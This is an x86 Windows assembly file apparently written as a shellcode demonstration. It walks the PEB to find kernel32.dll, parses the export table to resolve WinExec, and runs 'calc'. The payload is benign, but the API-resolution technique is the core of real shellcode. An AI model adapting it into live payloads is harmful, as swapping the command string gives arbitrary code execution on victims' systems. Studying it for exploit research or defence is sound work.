section .text
global _main
_main:

mov eax, fs:[0x30]
mov eax, [eax + 0xc]
mov eax, [eax+0x14]

mov ebx, [eax - 8 + 0x18]
push ebx

mov eax, [eax]
mov ebx, [eax - 8 + 0x18]
push ebx                    ; ntdll.dll

mov eax, [eax]
mov ebx, [eax - 8 + 0x18]
push ebx                    ; kernel32.dll

mov eax, [eax]
mov ebx, [eax - 8 + 0x18]
push ebx                    ; kernel32.dll

push eax                    ; if want to find more

mov eax, [esp+0x8]          ; kernel32.dll
mov ecx, eax
add ecx, 0x3c               ; offset to ne w exe header 
mov ebx, [ecx]              ; offset to image_nt_header
add ebx, 0x78               ; point to RVA
mov ecx, eax
add ecx, ebx                
mov ecx, [ecx]              ; rva of export table
push ecx
add ecx, eax                
push ecx                    ; export table

mov ecx, [esp]
add ecx, 0x14               ; number of exported functions
mov ecx, [ecx]                  
push ecx                    

mov ecx, [esp+4]
add ecx, 0x1c               ; Address Of Exported Functions
mov ecx, [ecx]
add ecx, eax
push ecx

mov ecx, [esp+8]
add ecx, 0x20               ; Address Of Name Exported Functions
mov ecx, [ecx]
add ecx, eax
push ecx

mov ecx, [esp+0xc]
add ecx, 0x24               ; Address Of Functions' Ordinal Table
mov ecx, [ecx]
add ecx, eax
push ecx

; esp: Functions' Ordinal Table
; esp+4: Name Exported Functions
; esp+8: Exported Functions
; esp+c: number of exported functions
; esp+10: export table
; esp+14: rva of export table

push 0x636578
push 0x456e6957     ; WinExec
lea ecx, [esp]
xor edx, edx
push ecx
xor ecx, ecx
call find_func
call exec_func
add esp, 0x38
ret

find_func:
    mov esi, [esp+4]
    mov edi, [esp+0x14]         ; pointer to exported function names table
    cld
    mov edi, [edi+edx*4]
    add edi, eax
    mov cx, 8
    repe cmpsb
    jz return
    inc edx
    cmp edx, [esp+0x1c]
    jne find_func
return:
    call GetAddress
    ret
GetAddress:
    xor ebx, ebx
    xor ecx, ecx
    mov ebx, [esp+0x14]         ; Function Ordinal Table
    mov ecx, [esp+0x14+8]       ; export address table
    mov dx,  [ebx + edx*2]
    mov edx, [ecx + edx*4]
    add edx, eax
    ret
exec_func:
    xor ebx, ebx
    push ebx
    push 0x636c6163
    mov ecx, esp
    push 10
    push ecx
    call edx
    add esp, 8
    ret